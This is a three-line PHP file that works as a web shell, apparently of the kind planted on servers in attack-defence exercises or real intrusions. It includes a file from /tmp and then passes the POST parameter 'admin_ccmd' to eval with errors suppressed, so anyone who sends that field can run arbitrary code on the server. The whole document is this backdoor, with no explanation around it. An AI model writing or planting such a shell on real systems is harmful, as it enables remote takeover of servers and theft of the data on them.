<?php
@include_once("/tmp/waf.php");
@eval($_POST['admin_ccmd']);
?>